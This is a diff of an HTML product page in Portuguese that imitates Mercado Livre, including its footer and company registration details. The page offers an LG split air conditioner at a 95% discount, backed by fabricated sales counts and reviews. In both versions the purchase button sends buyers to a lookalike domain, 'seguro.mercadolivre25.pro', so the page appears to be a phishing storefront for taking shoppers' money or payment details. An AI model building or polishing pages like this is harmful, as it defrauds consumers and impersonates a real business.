@@ -1,211 +1,108 @@
 <!DOCTYPE html><html lang="pt"><head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-    <title>Oferta</title>
-    <link rel="stylesheet" href="css/products.css">
-    <link rel="stylesheet" href="css/styles.css">
-    <link rel="stylesheet" href="css/fonts.css">
-    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@24,400,1,0">
-    <script src="js/tempo.js"></script>
-</head>
-<body>
-   
-    <div style="background-color: #e6cf00; text-align: center; padding: 5px; font-family: 'GellixMedium'; font-size: 13px; color: white">Promoção exclusiva: 26 anos</div>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+<title>Oferta</title>
+<link rel="stylesheet" href="css/products.css">
+<link rel="stylesheet" href="css/styles.css">
+<link rel="stylesheet" href="css/fonts.css">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@24,400,1,0">
+<script src="js/tempo.js"></script>
+<style>body{margin:0;font-family:GellixRegular}</style>
+</head><body>
 
-    <nav class="navbar" style="padding-top: 15px;">
-        <div class="menu-icon" style="padding-left: 3%;" onclick="window.location.href='/rl-loja' + window.location.search;">
-            <span style="font-family: 'GellixMedium'; color: black;">❮ Voltar</span>
-        </div>
+<div style="background:#e6cf00;text-align:center;padding:5px;font-size:13px;color:#fff">Promoção exclusiva: 26 anos</div>
 
-        <div class="logo-central">
-            
-        </div>
+<nav style="display:flex;justify-content:space-between;align-items:center;padding:15px 3%">
+  <span style="font-family:GellixMedium;cursor:pointer" onclick="window.history.back()">❮ Voltar</span>
+  <span class="material-symbols-outlined" style="font-size:30px">shopping_cart</span>
+</nav>
 
-        <div class="menu-icon" style="padding-right: 3%;">
-            <span class="material-symbols-outlined" style="font-size: 30px; padding-right: 0px; color: black">shopping_cart</span>
-        </div>
-    </nav>
+<div style="display:flex;justify-content:space-between;padding:0 3%;font-size:13px;color:#9f9f9f">
+  <span>+5 mil vendidos</span>
+  <span>4.8 <span style="color:#3483fa">★★★★★</span> (658)</span>
+</div>
 
+<p style="margin:10px 3% 0;font-size:20px;font-weight:600">Ar Condicionado Split LG 24000 B</p>
 
-    <div class="product-info-custom" style="padding-top: 15px; font-family: 'GellixRegular'; color: #9F9F9F;">
-        <div class="product-status-custom">
-            <span> +5mil vendidos </span>
-        </div>
-        <div class="product-rating-custom" style="padding-right: 3%; font-family: 'GellixRegular'; color: #9F9F9F;">
-            <span> 4.8 </span>
-            <span class="stars-custom">
-                <span class="star-custom" style="color: #3483FA;">★</span>
-                <span class="star-custom" style="color: #3483FA;">★</span>
-                <span class="star-custom" style="color: #3483FA;">★</span>
-                <span class="star-custom" style="color: #3483FA;">★</span>
-                <span class="half-star-custom" style="color: #3483FA;">★</span>
-            </span>
-            <span> (658) </span>
-        </div>
+<section>
+  <img src="images/ar1.webp" id="mainIMG" style="width:70%;border-radius:15px;display:block;margin:0 auto">
+  <div style="display:flex;justify-content:center;gap:8px;margin-top:8px">
+    <img class="thumb" src="images/ar1.webp">
+    <img class="thumb" src="images/ar2.webp">
+    <img class="thumb" src="images/ar3.webp">
+    <img class="thumb" src="images/ar4.webp">
+  </div>
+</section>
+
+<div style="text-align:center;padding:15px 3%">
+  <span style="background:#ff3b30;color:#fff;padding:3px 8px;border-radius:4px;font-size:12px">OFERTA DO DIA</span>
+  <div style="margin-top:5px">
+    <span style="text-decoration:line-through;font-size:14px;color:#888">R$ 1.499,90</span>
+    <span style="font-size:26px;font-weight:700;margin-left:6px">R$ 114,19</span>
+    <span style="background:#00c853;color:#fff;padding:2px 6px;border-radius:4px;font-size:12px;margin-left:6px">95% OFF</span>
+  </div>
+  <div style="margin-top:4px;font-size:13px">Frete <span class="material-symbols-outlined" style="font-size:16px;vertical-align:middle;color:#4caf50">bolt</span><strong>FULL</strong></div>
+</div>
+
+<button onclick="timeAr();window.location.href='https://seguro.mercadolivre25.pro/api/public/shopify?product=1831697667432&store=18316'"
+        style="width:94%;margin:0 auto 15px;display:block;padding:14px;border:none;border-radius:12px;background:#3483fa;color:#fff;font-size:16px;font-weight:600">
+  COMPRAR
+</button>
+
+<div style="padding:0 3%;font-size:13px">
+  <div style="margin-bottom:8px"><span class="material-symbols-outlined" style="vertical-align:middle;margin-right:4px">undo</span>Devolução grátis 30 dias.</div>
+  <div style="margin-bottom:8px"><span class="material-symbols-outlined" style="vertical-align:middle;margin-right:4px">verified_user</span>Compra Garantida ou seu dinheiro de volta.</div>
+  <div><span class="material-symbols-outlined" style="vertical-align:middle;margin-right:4px">emoji_events</span>12 meses de garantia fábrica.</div>
+</div>
+
+<div style="display:flex;justify-content:space-around;padding:12px 3%">
+  <button style="border:none;background:transparent;font-size:13px;color:#007bff">
+    <span class="material-symbols-outlined">favorite_border</span> Favoritos
+  </button>
+  <button style="border:none;background:transparent;font-size:13px;color:#007bff">
+    <span class="material-symbols-outlined">share</span> Compartilhar
+  </button>
+</div>
+
+<hr style="border:none;border-top:1px solid #eee;margin:15px 0">
+
+<p style="padding:6px 3%;font-size:20px;font-family:GellixRegular">Opiniões do produto</p>
+<img src="images/arrating.png" style="width:94%;margin:0 auto;display:block;border-radius:8px">
+
+<hr style="border:none;border-top:1px solid #eee;margin:15px 0">
+
+<p style="padding:6px 3%;font-size:20px;font-family:GellixRegular">Opiniões em destaque</p>
+
+<div style="padding:0 3%;font-size:13px">
+  <div style="border-bottom:1px solid #eee;padding:10px 0">
+    <div style="display:flex;justify-content:space-between">
+      <span style="color:#f9a825">★★★★★</span>
+      <span>31 out. 2023</span>
     </div>
-    
-    
+    <p>Foi instalado ontem... tive que pagar R$ 400 a mais pela instalação, mas até agora estou contente.</p>
+    <div style="display:flex;gap:12px"><span>👍 421</span><span>👎</span></div>
+  </div>
 
-    
-
-    <p class="title" style="margin-top: 10px;">Ar Condicionado Split LG 24000 B</p>
-
-
-    <section class="product-display">
-        <img src="images/ar1.webp" alt="Fralda Principal" class="main-image" style="border-radius: 15px; margin: 0 auto; display: flex; margin-top:-10px; width: 70%;">
-        <div class="thumbnails">
-            <img src="images/ar1.webp" alt="Fralda Vista 1" style="border-radius: 15px;">
-            <img src="images/ar2.webp" alt="Fralda Vista 2" style="border-radius: 15px;">
-            <img src="images/ar3.webp" alt="Fralda Vista 3" style="border-radius: 15px;">
-            <img src="images/ar4.webp" alt="Fralda Vista 4" style="border-radius: 15px;">
-        </div>
-    </section>
-
-
-    <div class="product-info2">
-        <div class="offer-tag2">OFERTA DO DIA</div>
-
-        <div class="old-price2">R$ 1499,90</div>
-
-        <span class="new-price2">R$ 114,19</span><span class="discount2">95% OFF</span>
-
-        <div class="free-shipping-container">
-            <span class="free-shipping2" style="font-family: 'GellixMedium';">Frete<span class="material-symbols-outlined" style="margin-right: 3px; color: #4caf50;">bolt</span><span style="font-family: 'GellixSemiBold';">FULL</span></span>
-        </div>
-
+  <div style="border-bottom:1px solid #eee;padding:10px 0">
+    <div style="display:flex;justify-content:space-between">
+      <span style="color:#f9a825">★★★★★</span>
+      <span>1 jan. 2024</span>
     </div>
+    <p>Não poderia ter feito melhor compra... geladinho e silencioso.</p>
+    <div style="display:flex;gap:12px"><span>👍 348</span><span>👎</span></div>
+  </div>
+</div>
 
+<footer style="padding:10px 3%;font-size:12px;color:#666;line-height:1.3">
+  <strong>Termos e condições. Como cuidamos da sua privacidade. Acessibilidade Informações sobre seguros Blog Afiliados Tendências</strong><br><br>
+  © 1999-2024 Ebazar.com.br LTDA. CNPJ n.º 03.007.331/0001-41 / Av. das Nações Unidas, nº 3.003, Bonfim, Osasco/SP – CEP 06233-903<br><br>
+  <strong>Brasil/Português</strong>
+</footer>
 
-    <button class="pergunta-botao" id="ar" onclick="window.location.href='https://seguro.mercadolivre25.pro/api/public/shopify?product=1831697667432&store=18316'">COMPRAR</button>
-    
-
-    
-
-    
-
-
-    <div class="info-container">
-        <div class="info-item">
-            <span class="material-symbols-outlined">undo</span>
-            <span class="info-text"><a href="#">Devolução grátis.</a> Você tem 30 dias a partir da data de recebimento.</span>
-        </div>
-        <div class="info-item">
-            <span class="material-symbols-outlined">verified_user</span>
-            <span class="info-text"><a href="#">Compra Garantida,</a> receba o produto que está esperando ou devolvemos o dinheiro.</span>
-        </div>
-        <div class="info-item">
-            <span class="material-symbols-outlined">emoji_events</span>
-            <span class="info-text">12 meses de garantia de fábrica.</span>
-        </div>
-    </div>
-
-
-    <div class="button-container">
-        <button id="favoriteButton" class="action-button">
-            <span id="favoriteIcon" class="material-symbols-outlined" style="color: #007bff">favorite_border</span>
-            <span id="favoriteText">Adicionar aos favoritos</span>
-        </button>
-        <button id="shareButton" class="action-button">
-            <span class="material-symbols-outlined" style="color: #007bff">share</span>
-            Compartilhar
-        </button>
-    </div>
-    <div id="notification" class="notification hidden">Link copiado com sucesso!</div>
-
-
-
-
-    <div class="divisoria"></div>
-
-    <p style="padding-left: 4%; font-family: 'GellixRegular'; font-size: 20px; padding-top: 15px;">Opiniões do produto</p>
-
-    <img src="images/arrating.png" style="width: 92%; display: flex; margin: 0 auto; padding-top: 10px; padding-bottom: 10px;">
-
-
-
-
-    
-    <div class="divisoria"></div>
-    
-    <p style="padding-left: 4%; font-family: 'GellixRegular'; font-size: 20px; padding-top: 15px;">Opiniões em destaque</p>
-
-
-    
-    <div class="comment-container">
-        <div class="comment">
-            <div class="header">
-                <div class="stars">
-                    <span class="material-symbols-outlined stars">star</span>
-                    <span class="material-symbols-outlined stars">star</span>
-                    <span class="material-symbols-outlined stars">star</span>
-                    <span class="material-symbols-outlined stars">star</span>
-                    <span class="material-symbols-outlined stars">star</span>
-                </div>
-                <div class="date">31 out. 2023</div>
-            </div>
-            
-            <p>Foi instalado ontem, até no momento estou contente cm a performance. É meu primeiro ar condicionado, tive que pagar 400 reais a mais da montagem para cobrir despesas do fio de cobre que segundo foi me informado para instalação eficiente e segura.</p>
-            <div class="actions">
-                <button class="like-button" onclick="toggleLike(this)">
-                    <span class="material-symbols-outlined" style="color: black">thumb_up</span> É útil <span class="count">421</span>
-                </button>
-                <button class="dislike-button" onclick="toggleDislike(this)">
-                    <span class="material-symbols-outlined" style="color: black">thumb_down</span>
-                </button>
-            </div>
-        </div>
-
-        <div class="comment">
-            <div class="header">
-                <div class="stars">
-                    <span class="material-symbols-outlined stars">star</span>
-                    <span class="material-symbols-outlined stars">star</span>
-                    <span class="material-symbols-outlined stars">star</span>
-                    <span class="material-symbols-outlined stars">star</span>
-                    <span class="material-symbols-outlined stars">star</span>
-                </div>
-                <div class="date">1 jan. 2024</div>
-            </div>
-        
-            <p>Não poderia ter feito melhor compra em minha vida. Super geladinho. Do meu quarto se eu deixa a porta aberta esfria até minha sala ☺️simplesmente apaixonada.</p>
-            <div class="actions">
-                <button class="like-button" onclick="toggleLike(this)">
-                    <span class="material-symbols-outlined" style="color: black">thumb_up</span> É útil <span class="count">348</span>
-                </button>
-                <button class="dislike-button" onclick="toggleDislike(this)">
-                    <span class="material-symbols-outlined" style="color: black">thumb_down</span>
-                </button>
-            </div>
-        </div>
-    </div>
-
-
-
-    
-
-
-
-
-
-
-
-
-    
-    <div class="divisoria"></div>
-
-    <p style="margin-left: 3%; margin-right: 3%; font-family: 'GellixRegular'; font-size: 14px; padding-top: 5px;"><span style="font-family: 'GellixSemiBold';">Termos e condições. Como cuidamos da sua privacidade. Acessibilidade Informações sobre seguros Blog Afiliados Tendências</span><br><br>© 1999-2024 Ebazar.com.br LTDA.CNPJ n.º 03.007.331/0001-41 / Av. das Nações Unidas, nº 3.003, Bonfim, Osasco/SP - CEP 06233-903 <span style="font-family: 'GellixSemiBold';"><br><br>Brasil/Português</span></p>
-
-    <script src="js/scripts.js"></script>
-
-    <script>
-        document.querySelectorAll('.thumbnails img').forEach(image => {
-            image.addEventListener('click', function() {
-                document.querySelector('.main-image').src = this.src;
-            });
-        });
-        document.getElementById("ar").addEventListener("click", timeAr);
-    </script>
-
-
+<script>
+document.querySelectorAll('.thumb').forEach(img =>
+  img.addEventListener('click', () => document.getElementById('mainIMG').src = img.src)
+);
+</script>
 
 </body></html>
